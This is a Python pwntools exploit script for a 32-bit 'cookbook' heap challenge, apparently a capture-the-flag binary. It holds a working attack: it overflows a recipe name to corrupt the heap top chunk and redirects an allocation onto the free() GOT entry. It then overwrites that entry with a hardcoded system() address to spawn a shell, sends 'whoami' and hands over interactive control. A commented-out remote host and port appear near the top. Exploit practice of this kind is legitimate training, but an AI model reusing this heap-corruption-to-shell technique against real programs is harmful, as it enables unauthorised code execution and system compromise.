# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
r = process('./cookbook')

libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
binn = ELF("./cookbook")


print(str(r.proc.pid))

def alloc(size):
    # r.recvuntil('Action:')
    r.sendline('1')
    r.sendline(str(size))
    r.recvuntil('OK\n')

# def set_cook_name(name, l):
#     r.sendline('g') #cookbook name
#     # r.sendline(str(len(name)))
#     r.sendline(l)
#     r.send(name) 

r.recv(timeout=0.1)


r.sendline('/bin/sh\0'.ljust(8,'\x00')) # name
# while 1:
#     pass    
res = r.recv(timeout=0.1)
print('[*] got res: ', res)
r.sendline('g') #cookbook name
r.recvuntil('chef and a hacker!) :')
r.sendline('10')
r.sendline('B'*15)
# pause()

r.recvuntil('uit\n')
r.sendline('c') # create recipe
r.sendline('n') # new recipe
r.sendline('g') # give recipe name
# r.send('A'*1036)
r.sendline('A'*896+p32(0xffffffff))
# r.sendline('q')
# set_cook_name('B'*0xfeeac000, '0xfeeac000')
r.recv(timeout=0.1)
r.sendline('q')
r.sendline('g') #cookbook name
# r.recvuntil('chef and a hacker!) :')
r.sendline('0xffffd9c0')   # 0x0804D0a0-0x804f6d0-16
# # r.sendline(str(int(0xfeeac000)))
# r.recvuntil('chef and a hacker!) :')
# r.sendline('ABCD')
# 0xff2309c8

free_got = binn.got['free'] # 0x804d018
# free_got = binn.got['free']
print('-------[*] free got: ', hex(free_got))
leak_libc = 0xf7e14000
# leak_system = leak_libc + 0x3ada0 # 0xf81c1a0
leak_system = 0xf7e4eda0
r.sendline('g')  # '0x804cf8c'
# r.send('13\n'+'AAAA'.ljust(4,'\x00')+p32(0x43)+p32(0x42))
# r.send('16\n'+'ABCD/bin/sh\0'.ljust(8,'\x43')+p32(0x44)+p32(free_got-140))
r.send('20\n'+p32(free_got-140))
# r.sendline('5')
# pause()
# r.send('\n\n')
r.sendline('q')
r.recvuntil('uit\n')
r.sendline('c') 
r.sendline('g') 
r.send(p32(leak_system)) 
# r.send(p32(0x41)) 
r.sendline('q\n')
r.sendline('q\n')
r.sendline('q\n')
r.sendline('whoami\n')

gdb.attach(r, """
heapinfo
x/10gx 0x0804d0a0-0x10
x/10gx 0x804d018

""");
print(str(r.proc.pid))

r.interactive()

